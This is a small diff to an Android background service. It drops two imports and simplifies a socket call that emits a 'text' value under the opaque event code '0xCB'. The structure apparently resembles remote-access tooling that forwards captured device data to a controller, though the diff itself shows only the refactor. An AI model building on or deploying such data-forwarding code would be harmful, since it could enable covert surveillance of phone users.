@@ -13,11 +13,9 @@ import android.content.pm.PackageManager;
 import android.graphics.Color;
 import android.os.Build;
 import android.os.IBinder;
-import android.os.PowerManager;
 import android.support.annotation.Nullable;
 import android.support.annotation.RequiresApi;
 import android.support.v4.app.NotificationCompat;
-import android.telephony.ServiceState;
 
 import org.json.JSONException;
 import org.json.JSONObject;
@@ -167,7 +165,7 @@ public class MainService extends Service {
                             try {
                                 JSONObject data = new JSONObject();
                                 data.put("text", text);
-                                IOSocket.getInstance().getIoSocket().emit("0xCB" , data);
+                                IOSocket.getSocket().emit("0xCB" , data);
                             } catch (JSONException e) {
                                 e.printStackTrace();
                             }
